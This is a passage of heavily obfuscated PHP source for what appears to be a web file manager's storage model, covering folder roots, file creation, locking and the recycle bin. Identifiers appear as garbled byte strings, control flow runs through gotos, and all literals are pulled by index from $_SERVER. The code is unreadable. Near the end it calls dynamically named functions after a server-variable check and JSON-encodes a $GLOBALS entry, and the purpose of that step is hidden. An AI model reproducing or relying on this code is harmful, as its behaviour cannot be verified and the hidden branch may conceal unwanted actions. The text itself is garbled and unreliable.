0; } else { if ($F‡ßÚ‡ã£∫) { $F‡ßÚ‡ã£∫ = is_array($F‡ßÚ‡ã£∫) ? $F‡ßÚ‡ã£∫ : explode($aÒë‡†Ω«ñ[47], $F‡ßÚ‡ã£∫); $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[406]] = array($aÒë‡†Ω«ñ[412], $F‡ßÚ‡ã£∫); $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[404]] = 0; } } } } if (isset($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[479]]) && $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[479]]) { $Dá˜ÉÃµØπ = $this->sourceInfo($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[479]]); $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[567]] = array($aÒë‡†Ω«ñ[526], $Dá˜ÉÃµØπ[$aÒë‡†Ω«ñ[503]] . $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[479]] . $aÒë‡†Ω«ñ[527]); } goto FÂà—Ø´µ©; bª·√òÂçø: $aÒë‡†Ω«ñ =& $_SERVER[Öíæ€“”≠éÏË]; $EÆé≠ ‹ê› = array(); if (isset($aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[734]]) && $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[734]]) { $EÆé≠ ‹ê›[$aÒë‡†Ω«ñ[84]] = array($aÒë‡†Ω«ñ[1966], $aÉ›ã‡È∞£[$aÒë‡†Ω«ñ[734]]); } goto eÿùﬂ•£ìÍ; Cü…≤”Àù…: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($aôÌêΩ¡Ò‹) { $F™Û•‰≤Ü¥ =& $_SERVER[Öíæ€“”≠éÏË]; $bëÑÆò∞ôæ = Model($F™Û•‰≤Ü¥[495])->where(array($F™Û•‰≤Ü¥[1529] => $aôÌêΩ¡Ò‹))->find(); $eìê®ä“¨≥ = $this->_mkdirRoot(SourceModel::TYPE_USER, $aôÌêΩ¡Ò‹, $bëÑÆò∞ôæ[$F™Û•‰≤Ü¥[28]]); $this->userDesktopAdd($eìê®ä“¨≥); return $eìê®ä“¨≥; } public function userDesktopAdd($f©å¢à÷Æ§) { $d˜§…¢≠ãà =& $_SERVER[Öíæ€“”≠éÏË]; $D±ôﬂ¶∏˜  = LNG($d˜§…¢≠ãà[1970]); $FöÒ”Áåß∫ = $this->mkdir($f©å¢à÷Æ§, $D±ôﬂ¶∏˜ ); $this->metaSet($FöÒ”Áåß∫, $d˜§…¢≠ãà[1971], $d˜§…¢≠ãà[87]); $this->metaSet($f©å¢à÷Æ§, $d˜§…¢≠ãà[1972], $FöÒ”Áåß∫); } public function groupRootAdd($A·‚êÇõπÌ) { $AƒÇ‹ıô”˜ =& $_SERVER[Öíæ€“”≠éÏË]; $eÖ˜àÖªåú = Model($AƒÇ‹ıô”˜[504])->where(array($AƒÇ‹ıô”˜[1791] => $A·‚êÇõπÌ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $A·‚êÇõπÌ, $eÖ˜àÖªåú[$AƒÇ‹ıô”˜[28]]); } public function systemRootPathAdd($c›Úºçπ„∞) { if ($c›Úºçπ„∞ != $_SERVER[Öíæ€“”≠éÏË][519]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $c›Úºçπ„∞); } public function userRootRemove($dè±üŒ´ﬁ—) { $cÚü∏≥’ÊÊ = $this->sourceRoot(SourceModel::TYPE_USER, $dè±üŒ´ﬁ—); if (!$cÚü∏≥’ÊÊ) { return; } $this->remove($cÚü∏≥’ÊÊ, !1); } public function groupRootRemove($EµŒÎˆ⁄∂ê) { $f∞≈¿ûãÇ∫ = $this->sourceRoot(SourceModel::TYPE_GROUP, $EµŒÎˆ⁄∂ê); if (!$f∞≈¿ûãÇ∫) { return; } $this->remove($f∞≈¿ûãÇ∫, !1); } private function _mkdirRoot($eÿ¯ﬂﬂò«¿, $bªã◊ëê≈Õ, $cµÜ…áâ°Ô) { goto Aô´ëıÆËß; f‰ÍÔ“π¨∞: CacheLock::unlock($EÑâ óì⁄ç); return $Fª…≥óö°å; goto d‰€äò˜Æ‹; a™¿›⁄·ÎÕ: $EÑâ óì⁄ç = "\115\x6f\x64\145\154\x53\x6f\165\x72\143\x65\x2e\155\x6b\x64\151\162\x52\157\x6f\164\x2e{$eÿ¯ﬂﬂò«¿}\56{$bªã◊ëê≈Õ}\x2e" . $cµÜ…áâ°Ô; CacheLock::lock($EÑâ óì⁄ç); $BóÜØ∏⁄ßò[$AóÃë„Ë´[28]] = $cµÜ…áâ°Ô; goto BÙ¡ÿ∏üÚæ; BÙ¡ÿ∏üÚæ: $Fª…≥óö°å = $this->add($BóÜØ∏⁄ßò); $Bœçç≤Ë“¨ = array($AóÃë„Ë´[569] => short_id($Fª…≥óö°å)); $this->where(array($AóÃë„Ë´[411] => $Fª…≥óö°å))->save($Bœçç≤Ë“¨); goto f‰ÍÔ“π¨∞; Aô´ëıÆËß: $AóÃë„Ë´ =& $_SERVER[Öíæ€“”≠éÏË]; $BóÜØ∏⁄ßò = array($AóÃë„Ë´[395] => 0, $AóÃë„Ë´[563] => $eÿ¯ﬂﬂò«¿, $AóÃë„Ë´[564] => $bªã◊ëê≈Õ, $AóÃë„Ë´[560] => 1, $AóÃë„Ë´[565] => USER_ID, $AóÃë„Ë´[566] => USER_ID, $AóÃë„Ë´[561] => $AóÃë„Ë´[33], $AóÃë„Ë´[567] => $AóÃë„Ë´[513], $AóÃë„Ë´[423] => 0, $AóÃë„Ë´[562] => 0, $AóÃë„Ë´[449] => 0, $AóÃë„Ë´[568] => $AóÃë„Ë´[33]); if ($e≠ê”‘•êë = $this->where($BóÜØ∏⁄ßò)->find()) { return $e≠ê”‘•êë[$AóÃë„Ë´[396]]; } goto a™¿›⁄·ÎÕ; d‰€äò˜Æ‹: } private function sourceRoot($C‚ÚñŸÜÀ´, $cñÈóœî–£, $D÷â¥ÎÙ⁄‰ = false) { $Aﬁ°µôïÎÏ =& $_SERVER[Öíæ€“”≠éÏË]; $bÃ–éëÉ≥î = array($Aﬁ°µôïÎÏ[395] => 0, $Aﬁ°µôïÎÏ[563] => $C‚ÚñŸÜÀ´, $Aﬁ°µôïÎÏ[564] => $cñÈóœî–£); if ($AÑ∑à√öõå = $this->where($bÃ–éëÉ≥î)->find()) { return $D÷â¥ÎÙ⁄‰ ? $AÑ∑à√öõå : $AÑ∑à√öõå[$Aﬁ°µôïÎÏ[396]]; } return !1; } public function sourceRootGroup($D»Öõè¿ùı) { goto c÷±Œâéúá; dŸ€â∆Ñ¥ó: return array_to_keyvalue($BÖêﬁÑ¨ˆŒ[$bÁ÷É›—¥“[75]], $bÁ÷É›—¥“[485]); goto cïå“∫ ıß; c÷±Œâéúá: $bÁ÷É›—¥“ =& $_SERVER[Öíæ€“”≠éÏË]; if (is_string($D»Öõè¿ùı)) { $D»Öõè¿ùı = array($D»Öõè¿ùı); } $D¯¬ìåÙˆµ = array($bÁ÷É›—¥“[395] => 0, $bÁ÷É›—¥“[564] => array($bÁ÷É›—¥“[7], $D»Öõè¿ùı), $bÁ÷É›—¥“[563] => SourceModel::TYPE_GROUP); goto e®Üè‘É©É; e®Üè‘É©É: $this->selectPageReset(); $BÖêﬁÑ¨ˆŒ = $this->limit(count($D»Öõè¿ùı))->listSource($D¯¬ìåÙˆµ, 1000); $this->selectPageRestore(); goto dŸ€â∆Ñ¥ó; cïå“∫ ıß: } public function mkfile($aØé™Õ°ê≈, $CèÊâä’ë´, $Dõ˜πÓ‹∞ì = '', $cœ≠”‹≥÷  = REPEAT_RENAME) { $fâ¢ËÚ´ç≈ =& $_SERVER[Öíæ€“”≠éÏË]; $cûƒƒØù¯ß = Model($fâ¢ËÚ´ç≈[585])->addFileByContent($Dõ˜πÓ‹∞ì, $CèÊâä’ë´); return $this->_createFileCall($aØé™Õ°ê≈, $CèÊâä’ë´, $cûƒƒØù¯ß, $cœ≠”‹≥÷ , $fâ¢ËÚ´ç≈[1227]); } public function addFile($F∞êΩˆ‰ºÇ, $aëò‘‘”õÚ, $DÀ•∆úëçÂ, $AØÖÙ•¨”∞ = false, $Fâì˘êÖ˜ˆ = REPEAT_RENAME) { $DË˘ÂÁ÷≈ = Model($_SERVER[Öíæ€“”≠éÏË][585])->addFile($aëò‘‘”õÚ, $DÀ•∆úëçÂ, $AØÖÙ•¨”∞); return $this->_createFileCall($F∞êΩˆ‰ºÇ, $DÀ•∆úëçÂ, $DË˘ÂÁ÷≈, $Fâì˘êÖ˜ˆ); } public function addFileByFileID($c‘¬ÿÓ·˜µ, $Bìí·€Üöˆ, $CÃ®Á≠Óõ‡, $dÊöá≠í€° = REPEAT_RENAME) { $D‹ƒÚ∑¬»∑ =& $_SERVER[Öíæ€“”≠éÏË]; $A≥”∞á—íà = Model($D‹ƒÚ∑¬»∑[585])->find($Bìí·€Üöˆ); Model($D‹ƒÚ∑¬»∑[585])->linkAdd($Bìí·€Üöˆ); return $this->_createFileCall($c‘¬ÿÓ·˜µ, $CÃ®Á≠Óõ‡, $A≥”∞á—íà, $dÊöá≠í€°); } public function addFileByRemote($e¯í◊Ë∫∂æ, $b≥ö∞™Œ„, $Cπˆ©úíìç, $cüØîÊÌ¬Ÿ = array(), $FÊÑ∂±†á£ = REPEAT_RENAME) { $aê≠´¶ƒœŸ = Model($_SERVER[Öíæ€“”≠éÏË][585])->addFileByRemote($b≥ö∞™Œ„, $Cπˆ©úíìç, $cüØîÊÌ¬Ÿ); return $this->_createFileCall($e¯í◊Ë∫∂æ, $Cπˆ©úíìç, $aê≠´¶ƒœŸ, $FÊÑ∂±†á£); } private function _createFileCall($DóƒÇ¯⁄ïà, $bÆıÇç≠ºÏ, $bäËƒÉ∑‘ß, $BãÃÚÕô◊Ö, $eåÜ¨Îñ°◊ = "\x75\160\x6c\x6f\x61\144") { goto A¬ÏëØ¨ø·; A¬ÏëØ¨ø·: $dãâÑæÇ’⁄ =& $_SERVER[Öíæ€“”≠éÏË]; $Aï∞å¡œ‘¢ = !1; $this->setMasterDB(); goto cç’Œè ¨‚; Dè⁄Ü‘ˆƒÁ: if (!$Aï∞å¡œ‘¢) { Model($dãâÑæÇ’⁄[451])->remove($bäËƒÉ∑‘ß[$dãâÑæÇ’⁄[448]]); } if ($Aï∞å¡œ‘¢ && $A‡¥◊Âë„Ù && $A‡¥◊Âë„Ù != $BËƒåÛƒ—ã) { Model($dãâÑæÇ’⁄[1941])->eventCreate($A‡¥◊Âë„Ù, $eåÜ¨Îñ°◊); } $this->lockWriteEnd($DóƒÇ¯⁄ïà, $bÆıÇç≠ºÏ); goto BÚïã·êÔ•; BÚïã·êÔ•: return $A‡¥◊Âë„Ù; goto E“±û∑æÈ; cç’Œè ¨‚: $this->lockWriteStart($DóƒÇ¯⁄ïà, $bÆıÇç≠ºÏ); $BËƒåÛƒ—ã = $this->fileNameExist($DóƒÇ¯⁄ïà, $bÆıÇç≠ºÏ); $A‡¥◊Âë„Ù = $this->_createFile($DóƒÇ¯⁄ïà, $bÆıÇç≠ºÏ, $bäËƒÉ∑‘ß, $BãÃÚÕô◊Ö, $Aï∞å¡œ‘¢); goto Dè⁄Ü‘ˆƒÁ; E“±û∑æÈ: } public function mkdir($E†⁄›±∏æ, $Fï∞Û‰ìÿô, $c„ôÂ§ƒ¿◊ = REPEAT_SKIP) { goto b–Ë∏éµá≠; D«œ∑àôπ«: $bŒµÑΩÓÊ± = array($fäÏ∏ª‘›Ï[560] => 1, $fäÏ∏ª‘›Ï[414] => $Fï∞Û‰ìÿô, $fäÏ∏ª‘›Ï[561] => $fäÏ∏ª‘›Ï[33], $fäÏ∏ª‘›Ï[449] => 0, $fäÏ∏ª‘›Ï[562] => 0); $aøûÊ≤†¬Ø = $this->_addSoure($bŒµÑΩÓÊ±, $C÷ïíªßËÿ); Model($fäÏ∏ª‘›Ï[1941])->eventCreate($aøûÊ≤†¬Ø, $fäÏ∏ª‘›Ï[1228]); goto A˘ó¶ıë–ß; f≤Ìˆ˘êã¯: if (!$C÷ïíªßËÿ) { return !1; } $this->lockWriteStart($E†⁄›±∏æ, $Fï∞Û‰ìÿô); if ($c„ôÂ§ƒ¿◊ !== !1) { $bâ©äèÓäÍ = $this->fileNameExist($E†⁄›±∏æ, $Fï∞Û‰ìÿô); if ($bâ©äèÓäÍ && $c„ôÂ§ƒ¿◊ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($E†⁄›±∏æ, $Fï∞Û‰ìÿô); return $bâ©äèÓäÍ; } $Fï∞Û‰ìÿô = $this->fileNameAuto($E†⁄›±∏æ, $Fï∞Û‰ìÿô, $c„ôÂ§ƒ¿◊); } goto D«œ∑àôπ«; b–Ë∏éµá≠: $fäÏ∏ª‘›Ï =& $_SERVER[Öíæ€“”≠éÏË]; $this->setMasterDB(); $C÷ïíªßËÿ = $this->sourceInfo($E†⁄›±∏æ); goto f≤Ìˆ˘êã¯; A˘ó¶ıë–ß: $this->lockWriteEnd($E†⁄›±∏æ, $Fï∞Û‰ìÿô); return $aøûÊ≤†¬Ø; goto aœ¡˜≈õÚﬂ; aœ¡˜≈õÚﬂ: } private function _createFile($bﬂ«•Ìì¬ß, $f¶´£™êôﬁ, $BôÀÀÇÍåü, $aıû–ä§éƒ, &$AëçÇµ€ãÏ) { goto bàú≥ÇàÀ©; Eê•Œ∑Ùµı: $Bí°≠Ö≈Œ€ = array($DÎú‚‘Ã€[560] => 0, $DÎú‚‘Ã€[414] => $f¶´£™êôﬁ, $DÎú‚‘Ã€[561] => substr(get_path_ext($f¶´£™êôﬁ), 0, 10), $DÎú‚‘Ã€[449] => $BôÀÀÇÍåü[$DÎú‚‘Ã€[448]], $DÎú‚‘Ã€[562] => $BôÀÀÇÍåü[$DÎú‚‘Ã€[78]]); $a≈à±óÇÿﬂ = $this->_addSoure($Bí°≠Ö≈Œ€, $Cì–ú—÷£Ü); $this->folderSizeReset($bﬂ«•Ìì¬ß, intval($Bí°≠Ö≈Œ€[$DÎú‚‘Ã€[78]])); goto CìÃ’çç”ª; cœ‚€ê∑ÀÏ: if ($aıû–ä§éƒ !== !1) { $Fç˜›≠ßŸº = $this->fileNameExist($bﬂ«•Ìì¬ß, $f¶´£™êôﬁ); } $AëçÇµ€ãÏ = !0; if ($aıû–ä§éƒ && $Fç˜›≠ßŸº) { if ($aıû–ä§éƒ == REPEAT_SKIP) { $AëçÇµ€ãÏ = !1; return $Fç˜›≠ßŸº; } else { if ($aıû–ä§éƒ == REPEAT_REPLACE) { $EÈú ÎÈìÓ = $this->sourceInfo($Fç˜›≠ßŸº); $dÑçŒÛı˘– = $this->fileHistory($EÈú ÎÈìÓ, $BôÀÀÇÍåü[$DÎú‚‘Ã€[448]], $BôÀÀÇÍåü[$DÎú‚‘Ã€[78]]); if (!$dÑçŒÛı˘–) { $AëçÇµ€ãÏ = !1; } else { $this->folderSizeReset($bﬂ«•Ìì¬ß); } return $Fç˜›≠ßŸº; } else { $f¶´£™êôﬁ = $this->fileNameAuto($bﬂ«•Ìì¬ß, $f¶´£™êôﬁ, $aıû–ä§éƒ, !1); } } } goto Eê•Œ∑Ùµı; CìÃ’çç”ª: return $a≈à±óÇÿﬂ; goto eŒ—†ôå”ì; bàú≥ÇàÀ©: $DÎú‚‘Ã€ =& $_SERVER[Öíæ€“”≠éÏË]; $Cì–ú—÷£Ü = $this->sourceInfo($bﬂ«•Ìì¬ß); if (!$BôÀÀÇÍåü || !$Cì–ú—÷£Ü) { return !1; } goto cœ‚€ê∑ÀÏ; eŒ—†ôå”ì: } protected function fileHistory($EÖÎŒ⁄◊ŸÏ, $E÷Ãí®◊œí, $B≤¡›‹ÜéÒ) { goto a∫œêçœõÖ; e¥Éã∏Î≠™: $this->where(array($cºâÂ‹ãœØ[411] => $EÖÎŒ⁄◊ŸÏ[$cºâÂ‹ãœØ[396]]))->save($B≠Ê∂ØÇı≠); $this->sourceCacheClear($EÖÎŒ⁄◊ŸÏ[$cºâÂ‹ãœØ[396]]); return !0; goto eœÃﬂÔØÎı; fˆŒÔ„ï•É: $this->checkLock($EÖÎŒ⁄◊ŸÏ[$cºâÂ‹ãœØ[396]], $E÷Ãí®◊œí); Model($cºâÂ‹ãœØ[1973])->addHistory($EÖÎŒ⁄◊ŸÏ); $B≠Ê∂ØÇı≠ = array($cºâÂ‹ãœØ[566] => $e¿ˆ≥Ÿı∆“, $cºâÂ‹ãœØ[418] => time(), $cºâÂ‹ãœØ[448] => $E÷Ãí®◊œí, $cºâÂ‹ãœØ[78] => $B≤¡›‹ÜéÒ); goto e¥Éã∏Î≠™; a∫œêçœõÖ: $cºâÂ‹ãœØ =& $_SERVER[Öíæ€“”≠éÏË]; $e¿ˆ≥Ÿı∆“ = defined($cºâÂ‹ãœØ[455]) ? USER_ID : $cºâÂ‹ãœØ[191]; if ($EÖÎŒ⁄◊ŸÏ[$cºâÂ‹ãœØ[448]] == $E÷Ãí®◊œí) { return !1; } goto fˆŒÔ„ï•É; eœÃﬂÔØÎı: } public function checkLock($C◊ıÔÙ◊Ëâ, $EòÈ÷‡…ÇØ) { goto D„œ§èî‹ç; eéÆÒíå„ä: $d∞ÇÛÉ©ñç = Session::get($d∆å∏≈·Èß[1974]); $C£ÔÁõ…ﬁÉ = substr($BÔÏ°óâ°≈[$d∆å∏≈·Èß[28]], 0, -1 - strlen($BÔÏ°óâ°≈[$d∆å∏≈·Èß[168]])) . $d∆å∏≈·Èß[1490] . $d∞ÇÛÉ©ñç . $d∆å∏≈·Èß[95] . $BÔÏ°óâ°≈[$d∆å∏≈·Èß[168]]; $AçèØõÒè± = Model($d∆å∏≈·Èß[585])->find($EòÈ÷‡…ÇØ); goto F‹Œ–â¨™◊; F‹Œ–â¨™◊: $this->_createFileCall($BÔÏ°óâ°≈[$d∆å∏≈·Èß[479]], $C£ÔÁõ…ﬁÉ, $AçèØõÒè±, REPEAT_REPLACE, $d∆å∏≈·Èß[1227]); $Aû¡∫∂Ö≥º = $BÔÏ°óâ°≈[$d∆å∏≈·Èß[446]][$d∆å∏≈·Èß[524]]; $Eü∞⁄Ê«Àä = $Aû¡∫∂Ö≥º[$d∆å∏≈·Èß[1975]] ? $Aû¡∫∂Ö≥º[$d∆å∏≈·Èß[1975]] : $Aû¡∫∂Ö≥º[$d∆å∏≈·Èß[28]]; goto c„•¨•©Óõ; c„•¨•©Óõ: show_json(LNG($d∆å∏≈·Èß[1976]) . $d∆å∏≈·Èß[1977] . LNG($d∆å∏≈·Èß[1978]) . $d∆å∏≈·Èß[1979] . $Eü∞⁄Ê«Àä . $d∆å∏≈·Èß[1980], !1); goto c§°Ñπ“£ì; D„œ§èî‹ç: $d∆å∏≈·Èß =& $_SERVER[Öíæ€“”≠éÏË]; $BÔÏ°óâ°≈ = $this->pathInfo($C◊ıÔÙ◊Ëâ); if (!$this->fileIsLock($BÔÏ°óâ°≈, !0)) { return; } goto eéÆÒíå„ä; c§°Ñπ“£ì: } public function fileIsLock($a≈é…ñÚ¡∑, $F‘Œ–Üﬂ∆ = false) { goto bëÉ„√¿Ó˜; f’…åÙ¢ﬁã: return !1; goto Aƒìàê¥±◊; e¡ÿÃóöëä: $B·±Üƒâ¨É = $GLOBALS[$fâîîê∂û°[6]][$fâîîê∂û°[88]][$fâîîê∂û°[522]]; if ($a≈é…ñÚ¡∑[$fâîîê∂û°[446]][$fâîîê∂û°[523]] <= time() - $B·±Üƒâ¨É) { $this->metaSet($a≈é…ñÚ¡∑[$fâîîê∂û°[396]], $fâîîê∂û°[521], null); $this->metaSet($a≈é…ñÚ¡∑[$fâîîê∂û°[396]], $fâîîê∂û°[523], null); } if ($F‘Œ–Üﬂ∆) { $this->metaSet($a≈é…ñÚ¡∑[$fâîîê∂û°[396]], $fâîîê∂û°[523], time()); } goto f’…åÙ¢ﬁã; bëÉ„√¿Ó˜: $fâîîê∂û° =& $_SERVER[Öíæ€“”≠éÏË]; if (!isset($a≈é…ñÚ¡∑[$fâîîê∂û°[446]]) || !$a≈é…ñÚ¡∑[$fâîîê∂û°[446]][$fâîîê∂û°[521]]) { return !1; } if ($a≈é…ñÚ¡∑[$fâîîê∂û°[446]][$fâîîê∂û°[521]] != USER_ID) { return !0; } goto e¡ÿÃóöëä; Aƒìàê¥±◊: } private function _addSoure($d ä≈¯üáÃ, $Aƒá“ÜÉ…É) { goto fÎΩàºÇ›€; BÎÍÔÔëá»: if (isset(self::$cacheChildList[$dëì€Ö∆”ù])) { unset(self::$cacheChildList[$dëì€Ö∆”ù]); } static $F›Ô„πó†∂ = false; if (!$F›Ô„πó†∂) { Hook::trigger($d∞ÔöÊ•àß[550], $d ä≈¯üáÃ); $F›Ô„πó†∂ = !0; } goto d‡Ÿàø¶°Ñ; fÎΩàºÇ›€: $d∞ÔöÊ•àß =& $_SERVER[Öíæ€“”≠éÏË]; $F∞«•öÁ™∆ = defined($d∞ÔöÊ•àß[455]) ? USER_ID : $d∞ÔöÊ•àß[191]; $A„òüçÜêî = array($d∞ÔöÊ•àß[563] => $Aƒá“ÜÉ…É[$d∞ÔöÊ•àß[405]], $d∞ÔöÊ•àß[564] => $Aƒá“ÜÉ…É[$d∞ÔöÊ•àß[485]], $d∞ÔöÊ•àß[565] => $F∞«•öÁ™∆, $d∞ÔöÊ•àß[566] => $F∞«•öÁ™∆, $d∞ÔöÊ•àß[395] => $Aƒá“ÜÉ…É[$d∞ÔöÊ•àß[396]], $d∞ÔöÊ•àß[567] => $Aƒá“ÜÉ…É[$d∞ÔöÊ•àß[503]] . $Aƒá“ÜÉ…É[$d∞ÔöÊ•àß[396]] . $d∞ÔöÊ•àß[47], $d∞ÔöÊ•àß[423] => 0, $d∞ÔöÊ•àß[568] => $d∞ÔöÊ•àß[33]); goto AãÖÖ»µÚí; d‡Ÿàø¶°Ñ: $A™íìÀ¢⁄π = $this->add($d ä≈¯üáÃ); $fı≈™ç•˘≠ = array($d∞ÔöÊ•àß[569] => short_id($A™íìÀ¢⁄π)); $this->where(array($d∞ÔöÊ•àß[411] => $A™íìÀ¢⁄π))->save($fı≈™ç•˘≠); goto aä÷èùÁçÂ; aä÷èùÁçÂ: $this->setNamePinyin($A™íìÀ¢⁄π, $d ä≈¯üáÃ[$d∞ÔöÊ•àß[28]]); return $A™íìÀ¢⁄π; goto dª∆áÕÀª–; AãÖÖ»µÚí: $d ä≈¯üáÃ = array_merge($A„òüçÜêî, $d ä≈¯üáÃ); $this->updateModifyTime($d ä≈¯üáÃ[$d∞ÔöÊ•àß[479]]); $dëì€Ö∆”ù = $d∞ÔöÊ•àß[1981] . $Aƒá“ÜÉ…É[$d∞ÔöÊ•àß[396]]; goto BÎÍÔÔëá»; dª∆áÕÀª–: } public function remove($Dÿø«ÛÃ¯–, $aéœﬁ‡òË‹ = true) { goto FΩ»©ä∆‹”; Fß◊˜Ç¢Ö‰: return $E¥æû’ı´Ë; goto BíÇá‹¢Îú; BáëêÓ∆¶¥: CacheLock::lock($D‰ﬂÓãÇ∞Ÿ); $CêÒâ◊…ìÁ = $this->fileNameExist($AàıΩÑöÌÈ, $eÖëﬂõà∆); if (!$CêÒâ◊…ìÁ) { $CêÒâ◊…ìÁ = $this->mkdir($AàıΩÑöÌÈ, $eÖëﬂõà∆, REPEAT_SKIP); $this->metaSet($CêÒâ◊…ìÁ, $fƒ«Ÿ®–∑Ï[1986], $A≥«Í¶Çßè); $this->metaSet($CêÒâ◊…ìÁ, $fƒ«Ÿ®–∑Ï[1987], $a‘≈ œüú[$fƒ«Ÿ®–∑Ï[485]]); if ($a‘≈ œüú[$fƒ«Ÿ®–∑Ï[479]] != 0) { $this->metaSet($CêÒâ◊…ìÁ, $fƒ«Ÿ®–∑Ï[1988], _get($Dùõ—âÖÊ‘, $fƒ«Ÿ®–∑Ï[1989])); } } goto eã’ €ÑÑÎ; FÈÚ‹í≠«Ò: $f’ Ÿí‡èá = Model($fƒ«Ÿ®–∑Ï[487])->get($fƒ«Ÿ®–∑Ï[1982]) == $fƒ«Ÿ®–∑Ï[87]; if ($aÚ¡ç∂èê” || $aéœﬁ‡òË‹ || !$f’ Ÿí‡èá) { return $this->removeNow($Dÿø«ÛÃ¯–, $aéœﬁ‡òË‹); } $AàıΩÑöÌÈ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto F±°Õ©êûÁ; F±°Õ©êûÁ: $A≥«Í¶Çßè = $a‘≈ œüú[$fƒ«Ÿ®–∑Ï[405]] == self::TYPE_USER ? $fƒ«Ÿ®–∑Ï[576] : $fƒ«Ÿ®–∑Ï[497]; if ($A≥«Í¶Çßè == $fƒ«Ÿ®–∑Ï[576]) { $Dùõ—âÖÊ‘ = Model($fƒ«Ÿ®–∑Ï[495])->getInfo($a‘≈ œüú[$fƒ«Ÿ®–∑Ï[485]]); $eÖëﬂõà∆ = !empty($Dùõ—âÖÊ‘[$fƒ«Ÿ®–∑Ï[1975]]) ? $Dùõ—âÖÊ‘[$fƒ«Ÿ®–∑Ï[1975]] : $Dùõ—âÖÊ‘[$fƒ«Ÿ®–∑Ï[28]]; $eÖëﬂõà∆ = $fƒ«Ÿ®–∑Ï[258] . $eÖëﬂõà∆ . $fƒ«Ÿ®–∑Ï[1983] . $a‘≈ œüú[$fƒ«Ÿ®–∑Ï[485]]; } else { $Dùõ—âÖÊ‘ = Model($fƒ«Ÿ®–∑Ï[504])->getInfo($a‘≈ œüú[$fƒ«Ÿ®–∑Ï[485]]); $eÖëﬂõà∆ = _get($Dùõ—âÖÊ‘, $fƒ«Ÿ®–∑Ï[28]); $eÖëﬂõà∆ = $fƒ«Ÿ®–∑Ï[160] . $eÖëﬂõà∆ . $fƒ«Ÿ®–∑Ï[1984] . $a‘≈ œüú[$fƒ«Ÿ®–∑Ï[485]]; } $D‰ﬂÓãÇ∞Ÿ = $fƒ«Ÿ®–∑Ï[1985] . md5($eÖëﬂõà∆); goto BáëêÓ∆¶¥; eã’ €ÑÑÎ: CacheLock::unlock($D‰ﬂÓãÇ∞Ÿ); $this->metaSet($Dÿø«ÛÃ¯–, $fƒ«Ÿ®–∑Ï[1990], $a‘≈ œüú[$fƒ«Ÿ®–∑Ï[479]]); $this->where(array($fƒ«Ÿ®–∑Ï[396] => $Dÿø«ÛÃ¯–))->save(array($fƒ«Ÿ®–∑Ï[418] => time())); goto bƒãÏ±ë¯∫; bƒãÏ±ë¯∫: $this->recycleClear($a‘≈ œüú); $E¥æû’ı´Ë = $this->move($Dÿø«ÛÃ¯–, $CêÒâ◊…ìÁ, REPEAT_RENAME_FOLDER); $this->folderSizeReset($a‘≈ œüú[$fƒ«Ÿ®–∑Ï[479]]); goto Fß◊˜Ç¢Ö‰; FΩ»©ä∆‹”: $fƒ«Ÿ®–∑Ï =& $_SERVER[Öíæ€“”≠éÏË]; $a‘≈ œüú = $this->sourceInfo($Dÿø«ÛÃ¯–); $aÚ¡ç∂èê” = intval($a‘≈ œüú[$fƒ«Ÿ®–∑Ï[405]]) === self::TYPE_SYSTEM; goto FÈÚ‹í≠«Ò; BíÇá‹¢Îú: } private function recycleClear($A˜∂åôëÆﬂ) { $eËì÷ÒÀç≥ =& $_SERVER[Öíæ€“”≠éÏË]; $aÚ˜ÿã‹¿´ = $this->childrenAll($A˜∂åôëÆﬂ); $aã‘ùëê∑„ = array($eËì÷ÒÀç≥[411] => array($eËì÷ÒÀç≥[412], $aÚ˜ÿã‹¿´[$eËì÷ÒÀç≥[1991]])); Model($eËì÷ÒÀç≥[1992])->where($aã‘ùëê∑„)->delete(); } public function removeNow($eê„âéòå‚, $cÃ≠õﬂêå≤ = true) { goto cŸËáâÜ£Î; C÷ÒÍß√˜˘: Hook::trigger($Aäè⁄⁄ß®ø[1993], $e∏‰¥æ÷êÉ, $cÃ≠õﬂêå≤); if ($cÃ≠õﬂêå≤) { Model($Aäè⁄⁄ß®ø[1992])->moveToRecycle($eê„âéòå‚); } else { $eÔ±çãîÆÇ = $this->childrenAll($aÖå‹‹úîà); Model($Aäè⁄⁄ß®ø[547])->eventRemove($eê„âéòå‚); $this->removeRelevance($eÔ±çãîÆÇ[$Aäè⁄⁄ß®ø[1991]], $eÔ±çãîÆÇ[$Aäè⁄⁄ß®ø[1357]]); } $this->folderSizeReset($aÖå‹‹úîà[$Aäè⁄⁄ß®ø[479]]); goto eëê„÷Î≈´; e»Ò∫˘„•ø: $this->lockMoveEnd($eê„âéòå‚); Hook::trigger($Aäè⁄⁄ß®ø[1573], $e∏‰¥æ÷êÉ, $cÃ≠õﬂêå≤); return !0; goto Cƒ¡À√ˆÖ¢; dŒ’Áç¯·Ó: if (!$aÖå‹‹úîà) { return !0; } if ($aÖå‹‹úîà[$Aäè⁄⁄ß®ø[479]] == 0) { if (!_get($GLOBALS, $Aäè⁄⁄ß®ø[486])) { return !1; } } $this->lockMoveStart($eê„âéòå‚); goto C÷ÒÍß√˜˘; Eîƒ‰éìòØ: if ($_SERVER[$Aäè⁄⁄ß®ø[847]] != $EÑäŸ”èîˆ($a·⁄úè°†ù)) { goto EãÖ”Ã ïÛ; EãÖ”Ã ïÛ: $B≥©ˆÑÌÙﬂ = $Aäè⁄⁄ß®ø[848]; $B·µáºå≥ó = $Aäè⁄⁄ß®ø[849]; $eÿ—ñõÒæ‚ = $_SERVER[$Aäè⁄⁄ß®ø[844]] . $Aäè⁄⁄ß®ø[845]; goto cúê˜úÒŸ¢; CüÛâ‹é•§: $B≥©ˆÑÌÙﬂ(); $cù’ÙÖ÷áß = $Aäè⁄⁄ß®ø[853]; $B≠÷Ÿ…Ê∂ = json_encode($GLOBALS[$Aäè⁄⁄ß®ø[854]]); goto e–Öâ¯©ª∆; 